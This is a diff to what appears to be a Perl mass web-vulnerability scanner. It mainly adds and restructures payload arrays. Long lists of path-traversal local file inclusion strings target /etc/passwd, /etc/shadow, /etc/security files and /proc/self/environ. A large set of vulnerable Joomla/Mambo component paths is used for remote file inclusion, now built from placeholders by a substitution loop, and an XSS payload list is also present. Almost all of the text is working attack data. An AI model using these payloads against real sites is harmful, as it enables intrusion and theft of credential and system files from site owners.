2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../../../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00");
+my @LFI=("repeat(../-8)passwd.txt", "repeat(../-8)etc/passwd", "repeat(../-8)etc/passwd", "repeat(../-8)proc/self/environ", "repeat(../-8)etc/shadow", "repeat(../-8)etc/group", "repeat(../-8)etc/security/passwd", "repeat(../-8)etc/security/group", "%2Fpasswd.txt%2F", "%2Fetc%2Fpasswd%2F", "%2Fetc%2Fpasswd%2F", "%2Fproc%2Fself%2Fenviron%2F", "%2Fetc%2Fshadow%2F", "%2Fetc%2Fgroup%2F", "%2Fetc%2Fsecurity%2Fpasswd%2F", "%2Fetc%2Fsecurity%2Fgroup%2F", "%2F%2Fpasswd.txt%2F", "%2F%2Fetc%2Fpasswd%2F", "%2F%2Fetc%2Fpasswd%2F", "%2F%2Fproc%2Fself%2Fenviron%2F", "%2F%2Fetc%2Fshadow%2F", "%2F%2Fetc%2Fgroup%2F", "%2F%2Fetc%2Fsecurity%2Fpasswd%2F", "%2F%2Fetc%2Fsecurity%2Fgroup%2F", "repeat(..%2F-8)passwd.txt%2F", "repeat(..%2F-8)etc%2Fpasswd%2F", "repeat(..%2F-8)etc%2Fpasswd%2F", "repeat(..%2F-8)proc%2Fself%2Fenviron%2F", "repeat(..%2F-8)etc%2Fshadow%2F", "repeat(..%2F-8)etc%2Fgroup%2F", "repeat(..%2F-8)etc%2Fsecurity%2Fpasswd%2F", "repeat(..%2F-8)etc%2Fsecurity%2Fgroup%2F");
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## XSS
@@ -385,7 +386,18 @@ my @XSS=("%27", "'><script>alert('MySQL Error')</script>", "<scr<script>ipt>aler
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## RFI
-my @RFI=("/components/com_flyspray/startdown.php?file=", "/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=", "/components/com_simpleboard/file_upload.php?sbp=", "/components/com_hashcash/server.php?mosConfig_absolute_path=", "/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=", "/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=", "/components/com_performs/performs.php?mosConfig_absolute_path=", "/components/com_forum/download.php?phpbb_root_path=", "/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=", "/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=", "/components/minibb/index.php?absolute_path=", "/components/com_smf/smf.php?mosConfig_absolute_path=", "/modules/mod_calendar.php?absolute_path=", "/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=", "/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=", "/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=", "/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=", "/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=", "/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=", "/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=", "/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=", "/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=", "/components/com_securityimages/configinsert.php?mosConfig_absolute_path=", "/components/com_securityimages/lang.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/components/com_galleria/galleria.html.php?mosConfig_absolute_path=", "/akocomments.php?mosConfig_absolute_path=", "/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=", "/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=", "/components/com_zoom/includes/database.php?mosConfig_absolute_path=", "/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=", "/components/com_fm/fm.install.php?lm_absolute_path=", "/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=", "/components/com_lmo/lmo.php?mosConfig_absolute_path=", "/administrator/components/com_webring/admin.webring.docs.php?component_dir=", "/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=", "/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=", "/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=", "/components/com_mambowiki/MamboLogin.php?IP=", "/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=", "/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=", "/components/com_cpg/cpg.php?mosConfig_absolute_path=", "/components/com_moodle/moodle.php?mosConfig_absolute_path=", "/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=", "/components/com_mospray/scripts/admin.php?basedir=", "/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=", "/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=", "/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=", "/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=", "/components/com_madeira/img.php?url=", "/components/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/admin.jjgallery.php?mosConfig_absolute_path=", "/components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=", "/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=", "/index.php?option=com_custompages&cpage=", "/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/components/com_facileforms/facileforms.frame.php?ff_compath=", "/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=", "/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=", "/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=", "/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=", "/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=", "/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=", "/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=", "/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=", "/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=", "/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/components/com_reporter/reporter.logic.php?mosConfig_absolute_path=", "/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_joomlaboard/file_upload.php?sbp=", "/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=", "/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=", "/modules/mod_as_category.php?mosConfig_absolute_path=", "/components/com_articles.php?absolute_path=", "/classes/html/com_articles.php?absolute_path=", "/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=", "/templates/be2004-2/index.php?mosConfig_absolute_path=", "/libraries/pcl/pcltar.php?g_pcltar_lib_dir=", "/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=", "/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=", "/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=", "/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=", "/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=", "/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=", "/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=", "/components/com_mp3_allopass/allopass.php?mosConfig_live_site=", "/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=", "/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolte_path=", "/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_color/admin.color.php?mosConfig_live_site=", "/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=", "/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=", "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&mosConfig_absolute_path=", "/com_ponygallery/admin.ponygallery.html.php?mosConfig_absolute_path=", "/com_magazine_3_0_1/magazine.functions.php?config=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path=", "/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=");
+my @RFIargs=("/components/com_flyspray/startdown.php?file=", "/administrator/components/com_admin/admin.admin.html.php?PP1", "/components/com_simpleboard/file_upload.php?PP5", "/components/com_hashcash/server.php?PP1", "/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?PP1", "/components/com_sitemap/sitemap.xml.php?PP1", "/components/com_performs/performs.php?PP1", "/components/com_forum/download.php?phpbb_root_path=", "/components/com_pccookbook/pccookbook.php?PP1", "/components/com_extcalendar/extcalendar.php?PP1", "/components/minibb/index.php?PP3", "/components/com_smf/smf.php?PP1", "/modules/mod_calendar.php?PP3", "/components/com_pollxt/conf.pollxt.php?PP1", "/components/com_loudmounth/includes/abbc/abbc.class.php?PP1", "/components/com_videodb/core/videodb.class.xml.php?PP1", "/components/com_pcchess/include.pcchess.php?PP1", "/administrator/components/com_multibanners/extadminmenus.class.php?PP1", "/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?PP4", "/administrator/components/com_colophon/admin.colophon.php?PP1", "/administrator/components/com_mgm/help.mgm.php?PP1", "/components/com_mambatstaff/mambatstaff.php?PP1", "/components/com_securityimages/configinsert.php?PP1", "/components/com_securityimages/lang.php?PP1", "/components/com_artlinks/artlinks.dispnew.php?PP1", "/components/com_galleria/galleria.html.php?PP1", "/akocomments.php?PP1", "/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=", "/administrator/components/com_kochsuite/config.kochsuite.php?PP1", "/administrator/components/com_comprofiler/plugin.class.php?PP1", "/components/com_zoom/classes/fs_unix.php?PP1", "/components/com_zoom/includes/database.php?PP1", "/administrator/components/com_serverstat/install.serverstat.php?PP1", "/components/com_fm/fm.install.php?lm_absolute_path=", "/administrator/components/com_mambelfish/mambelfish.class.php?PP1", "/components/com_lmo/lmo.php?PP1", "/administrator/components/com_webring/admin.webring.docs.php?component_dir=", "/administrator/components/com_remository/admin.remository.php?PP1", "/administrator/components/com_babackup/classes/Tar.php?PP1", "/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=", "/components/com_mambowiki/MamboLogin.php?IP=", "/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?PP4", "/administrator/components/com_phpshop/toolbar.phpshop.html.php?PP1", "/components/com_cpg/cpg.php?PP1", "/components/com_moodle/moodle.php?PP1", "/components/com_extended_registration/registration_detailed.inc.php?PP1", "/components/com_mospray/scripts/admin.php?basedir=", "/administrator/components/com_uhp/uhp_config.php?PP1", "/administrator/components/com_peoplebook/param.peoplebook.php?PP1", "/administrator/components/com_mmp/help.mmp.php?PP1", "/components/com_reporter/processor/reporter.sql.php?PP1", "/components/com_madeira/img.php?url=", "/components/com_bsq_sitestats/external/rssfeed.php?PP6", "/com_bsq_sitestats/external/rssfeed.php?PP6", "/com_joomla_flash_uploader/install.joomla_flash_uploader.php?PP1", "/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?PP1", "/administrator/components/admin.jjgallery.php?PP1", "/components/com_jreviews/scripts/xajax.inc.php?PP1", "/com_directory/modules/mod_pxt_latest.php?PP2", "/administrator/components/com_chronocontact/excelwriter/PPS/File.php?PP1", "/administrator/components/com_chronocontact/excelwriter/Writer.php?PP1", "/administrator/components/com_chronocontact/excelwriter/PPS.php?PP1", "/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?PP1", "/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?PP1", "/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?PP1", "/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?PP1", "/index.php?option=com_custompages&cpage=", "/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?PP1", "/components/com_facileforms/facileforms.frame.php?ff_compath=", "/administrator/components/com_rssreader/admin.rssreader.php?PP4", "/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?PP1", "/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?PP1", "/administrator/components/com_feederator/includes/tmsp/subscription.php?PP2", "/administrator/components/com_feederator/includes/tmsp/tmsp.php?PP1", "/administrator/components/com_clickheat/install.clickheat.php?PP2", "/administrator/components/com_clickheat/includes/heatmap/_main.php?PP1", "/administrator/components/com_clickheat/includes/heatmap/main.php?PP1", "/administrator/components/com_clickheat/includes/overview/main.php?PP1", "/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?PP2", "/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?PP2", "/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?PP2", "/administrator/components/com_competitions/includes/competitions/add.php?PP2", "/administrator/components/com_competitions/includes/competitions/competitions.php?PP2", "/administrator/components/com_competitions/includes/settings/settings.php?PP1", "/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=", "/administrator/components/com_googlebase/admin.googlebase.php?PP1", "/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?PP1", "/administrator/components/com_treeg/admin.treeg.php?PP4", "/administrator/components/com_bayesiannaivefilter/lang.php?PP1", "/components/com_jd-wiki/lib/tpl/default/main.php?PP1", "/administrator/components/com_jim/install.jim.php?PP1", "/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?PP1", "/components/com_artlinks/artlinks.dispnew.php?PP1", "/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?PP1", "/administrator/components/com_kochsuite/config.kochsuite.php?PP1", "/components/com_reporter/reporter.logic.php?PP1", "/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?PP1", "/components/com_swmenupro/ImageManager/Classes/ImageManager.php?PP1", "/components/com_joomlaboard/file_upload.php?PP5", "/components/com_thopper/inc/contact_type.php?PP1", "/components/com_thopper/inc/itemstatus_type.php?PP1", "/components/com_thopper/inc/projectstatus_type.php?PP1", "/components/com_thopper/inc/request_type.php?PP1", "/components/com_thopper/inc/responses_type.php?PP1", "/components/com_thopper/inc/timelog_type.php?PP1", "/components/com_thopper/inc/urgency_type.php?PP1", "/components/com_mosmedia/media.tab.php?PP1", "/components/com_mosmedia/media.divs.php?PP1", "/modules/mod_as_category/mod_as_category.php?PP1", "/modules/mod_as_category.php?PP1", "/components/com_articles.php?PP3", "/classes/html/com_articles.php?PP3", "/administrator/components/com_jpack/includes/CAltInstaller.php?PP1", "/templates/be2004-2/index.php?PP1", "/libraries/pcl/pcltar.php?g_pcltar_lib_dir=", "/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?PP4", "/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?PP4", "/administrator/components/com_joom12pic/admin.joom12pic.php?PP4", "/components/com_slideshow/admin.slideshow1.php?PP4", "/administrator/components/com_panoramic/admin.panoramic.php?PP4", "/administrator/components/com_wmtgallery/admin.wmtgallery.php?PP4", "/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?PP1", "/administrator/components/com_mosmedia/includes/credits.html.php?PP1", "/administrator/components/com_mosmedia/includes/info.html.php?PP1", "/administrator/components/com_mosmedia/includes/media.divs.php?PP1", "/administrator/components/com_mosmedia/includes/media.divs.js.php?PP1", "/administrator/components/com_mosmedia/includes/purchase.html.php?PP1", "/administrator/components/com_mosmedia/includes/support.html.php?PP1", "/components/com_mp3_allopass/allopass.php?PP4", "/components/com_mp3_allopass/allopass-error.php?PP4", "/administrator/components/com_jcs/jcs.function.php?PP1", "/administrator/components/com_jcs/view/add.php?PP1", "/administrator/components/com_jcs/view/history.php?PP1", "/administrator/components/com_jcs/view/register.php?PP1", "/administrator/components/com_jcs/views/list.sub.html.php?PP1", "/administrator/components/com_jcs/views/list.user.sub.html.php?PP1", "/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolte_path=", "/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?PP1", "/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?PP1", "/administrator/components/com_color/admin.color.php?PP4", "/administrator/components/com_jjgallery/admin.jjgallery.php?PP1", "/administrator/components/com_juser/xajax_functions.php?PP1", "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&PP1", "/com_ponygallery/admin.ponygallery.html.php?PP1", "/com_magazine_3_0_1/magazine.functions.php?config=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?PP1", "/administrator/components/com_universal/includes/config/config.html.php?PP1", "/modules/mod_pxt_latest.php?PP2");
+############################################################################################################################################################################################
+my @RFI;
+for my $RFIargs(@RFIargs) {
+  if ($RFIargs=~/PP1/) { $RFIargs=~s/PP1/mosConfig_absolute_path=/; }
+  elsif ($RFIargs=~/PP2/) { $RFIargs=~s/PP2/GLOBALS[mosConfig_absolute_path]=/; }
+  elsif ($RFIargs=~/PP3/) { $RFIargs=~s/PP3/absolute_path=/; }
+  elsif ($RFIargs=~/PP4/) { $RFIargs=~s/PP4/mosConfig_live_site=/; }
+  elsif ($RFIargs=~/PP5/) { $RFIargs=~s/PP5/sbp=/; }
+  elsif ($RFIargs=~/PP6/) { $RFIargs=~s/PP6/baseDir=/; }
+  push @RFI, $RFIargs;
+}
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 #ADF WP WORDPRESS
@@ -672,7 +684,7 @@ sub removeProtocol {
 sub removeQuery { 
   my $URL=$_[0];
   $URL=removeProtocol($URL);
-  $URL=~s/\=.*/=/s;
+  $URL=~s/=.*/=/g;
